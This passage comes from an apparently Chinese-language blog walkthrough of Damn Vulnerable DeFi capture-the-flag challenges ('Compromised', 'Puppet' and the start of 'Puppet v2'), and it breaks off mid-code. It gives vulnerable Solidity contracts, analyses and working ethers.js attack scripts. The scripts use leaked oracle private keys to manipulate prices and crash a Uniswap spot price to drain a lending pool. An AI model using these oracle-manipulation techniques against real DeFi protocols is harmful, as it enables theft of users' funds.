keyword\">return</span> arrayOfNumbers<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"analyze-6\"><a href=\"#analyze-6\" class=\"headerlink\" title=\"analyze\"></a>analyze</h2><p>题目中的数字事十六进制，转字符串之后是字符串，进行base64解码得到私钥，分别对应account(0xe92401A4d3af5E446d93D11EEc806b1462b39D15)和account(0x81A5D6E50C214044bE44cA0CB057fe119097850c)。</p>\n<p>再exchange中发现价格来源于TrustfulOracle中的getMedianPrice。审计TrustfulOracle合约发现_ sort()函数进行三人价格排序，</p>\n<p>_computeMedianPrice()函数获得价格中位数。当前价格为[999,999,999]。</p>\n<p>我们分别使用两个账户调用postPrice()函数，将价格设置为0，价格变为[0,0,999],再购买一个nft。因为漏洞合约本来总共具有9999eth，所以再分别使用两个账户调用postPrice()函数，将价格设置为9990，价格变为[999,9990,9990],再卖出一个nft，即可获得巨大利润</p>\n<h2 id=\"attack-6\"><a href=\"#attack-6\" class=\"headerlink\" title=\"attack\"></a>attack</h2><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">let</span> privateKey1 <span class=\"token operator\">=</span> <span class=\"token string\">\"0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9\"</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">let</span> privateKey2 <span class=\"token operator\">=</span> <span class=\"token string\">\"0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48\"</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">let</span> compromisedOracle1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ethers<span class=\"token punctuation\">.</span>Wallet</span><span class=\"token punctuation\">(</span>privateKey1<span class=\"token punctuation\">,</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">let</span> compromisedOracle2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ethers<span class=\"token punctuation\">.</span>Wallet</span><span class=\"token punctuation\">(</span>privateKey2<span class=\"token punctuation\">,</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>oracle<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>compromisedOracle1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">postPrice</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DVNFT\"</span><span class=\"token punctuation\">,</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>oracle<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>compromisedOracle2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">postPrice</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DVNFT\"</span><span class=\"token punctuation\">,</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">const</span> tx <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>exchange<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">buyOne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">value</span><span class=\"token operator\">:</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0.01\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>exchange<span class=\"token punctuation\">.</span><span class=\"token function\">on</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"TokenBought\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">async</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">sender<span class=\"token punctuation\">,</span> tokenId<span class=\"token punctuation\">,</span> currentPriceInWei</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n   \t<span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>nftToken<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>exchange<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> tokenId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>oracle<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>compromisedOracle1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">postPrice</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DVNFT\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">EXCHANGE_INITIAL_ETH_BALANCE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>oracle<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>compromisedOracle2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">postPrice</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DVNFT\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">EXCHANGE_INITIAL_ETH_BALANCE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>exchange<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sellOne</span><span class=\"token punctuation\">(</span>tokenId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>oracle<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>compromisedOracle1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">postPrice</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DVNFT\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">INITIAL_NFT_PRICE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>oracle<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>compromisedOracle2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">postPrice</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DVNFT\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">INITIAL_NFT_PRICE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">await</span> tx<span class=\"token punctuation\">.</span><span class=\"token function\">wait</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h1 id=\"8-Puppet\"><a href=\"#8-Puppet\" class=\"headerlink\" title=\"8.Puppet\"></a>8.Puppet</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：</p>\n<p>There’s a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.</p>\n<p>There’s a DVT market opened in an <a href=\"https://docs.uniswap.org/protocol/V1/introduction\">Uniswap v1 exchange</a>, currently with 10 ETH and 10 DVT in liquidity.</p>\n<p>Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.</p></blockquote>\n<h2 id=\"code-4\"><a href=\"#code-4\" class=\"headerlink\" title=\"code\"></a>code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/security/ReentrancyGuard.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/Address.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"../DamnValuableToken.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * @title PuppetPool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">PuppetPool</span> <span class=\"token keyword\">is</span> ReentrancyGuard <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">Address</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> deposits<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> immutable uniswapPair<span class=\"token punctuation\">;</span>\n    DamnValuableToken <span class=\"token keyword\">public</span> immutable token<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">event</span> <span class=\"token function\">Borrowed</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> account<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> depositRequired<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> borrowAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> uniswapPairAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        token <span class=\"token operator\">=</span> <span class=\"token function\">DamnValuableToken</span><span class=\"token punctuation\">(</span>tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        uniswapPair <span class=\"token operator\">=</span> uniswapPairAddress<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Allows borrowing `borrowAmount` of tokens by first depositing two times their value in ETH</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">borrow</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> borrowAmount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> depositRequired <span class=\"token operator\">=</span> <span class=\"token function\">calculateDepositRequired</span><span class=\"token punctuation\">(</span>borrowAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">>=</span> depositRequired<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not depositing enough collateral\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">></span> depositRequired<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sendValue</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">-</span> depositRequired<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        deposits<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> deposits<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> depositRequired<span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Fails if the pool doesn't have enough tokens in liquidity</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> borrowAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Transfer failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Borrowed</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> depositRequired<span class=\"token punctuation\">,</span> borrowAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">calculateDepositRequired</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> amount <span class=\"token operator\">*</span> <span class=\"token function\">_computeOraclePrice</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">/</span> <span class=\"token number\">10</span> <span class=\"token operator\">**</span> <span class=\"token number\">18</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_computeOraclePrice</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// calculates the price of the token in wei according to Uniswap pair</span>\n        <span class=\"token keyword\">return</span> uniswapPair<span class=\"token punctuation\">.</span>balance <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">**</span> <span class=\"token number\">18</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>uniswapPair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n     <span class=\"token comment\">/**\n     ... functions to deposit, redeem, repay, calculate interest, and so on ...\n     */</span>\n\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"analyze-7\"><a href=\"#analyze-7\" class=\"headerlink\" title=\"analyze\"></a>analyze</h2><p>_computeOraclePrice()函数中依靠的是外部合约的余额而制定价格，在uniswapPair中存在10eth以及10dvt。而这个比值也直接影响了在调用borrow()函数时的msg.value限制。</p>\n<p>所以我们可以在uniswapPair中大量卖出dvt，从而使dvt价格暴跌，在解出所有的dvt即可。</p>\n<h2 id=\"attack-7\"><a href=\"#attack-7\" class=\"headerlink\" title=\"attack\"></a>attack</h2><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>uniswapExchange<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> <span class=\"token constant\">ATTACKER_INITIAL_TOKEN_BALANCE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n             <span class=\"token keyword\">const</span> tx <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>uniswapExchange<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">tokenToEthSwapOutput</span><span class=\"token punctuation\">(</span>ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'9.9'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                 <span class=\"token constant\">ATTACKER_INITIAL_TOKEN_BALANCE</span><span class=\"token punctuation\">,</span>\n                 <span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBlock</span><span class=\"token punctuation\">(</span><span class=\"token string\">'latest'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span>\n                 <span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">gasLimit</span><span class=\"token operator\">:</span> <span class=\"token number\">1e6</span> <span class=\"token punctuation\">&#125;</span>\n             <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n             <span class=\"token keyword\">await</span> tx<span class=\"token punctuation\">.</span><span class=\"token function\">wait</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n             <span class=\"token keyword\">const</span> depositRequired <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>lendingPool<span class=\"token punctuation\">.</span><span class=\"token function\">calculateDepositRequired</span><span class=\"token punctuation\">(</span><span class=\"token constant\">POOL_INITIAL_TOKEN_BALANCE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n             <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>depositRequired <span class=\"token operator\">&lt;</span> <span class=\"token constant\">ATTACKER_INITIAL_ETH_BALANCE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n             <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>lendingPool<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">borrow</span><span class=\"token punctuation\">(</span><span class=\"token constant\">POOL_INITIAL_TOKEN_BALANCE</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span><span class=\"token literal-property property\">value</span><span class=\"token operator\">:</span> depositRequired<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h1 id=\"9-Puppet-v2\"><a href=\"#9-Puppet-v2\" class=\"headerlink\" title=\"9.Puppet v2\"></a>9.Puppet v2</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：</p>\n<p>The developers of the <a href=\"https://www.damnvulnerabledefi.xyz/challenges/8.html\">last lending pool</a> are saying that they’ve learned the lesson. And just released a new version!</p>\n<p>Now they’re using a <a href=\"https://docs.uniswap.org/protocol/V2/introduction\">Uniswap v2 exchange</a> as a price oracle, along with the recommended utility libraries. That should be enough.</p>\n<p>You start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)</p></blockquote>\n<h2 id=\"code-5\"><a href=\"#code-5\" class=\"headerlink\" title=\"code\"></a>code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@uniswap/v2-periphery/contracts/libraries/SafeMath.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">IERC20</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token 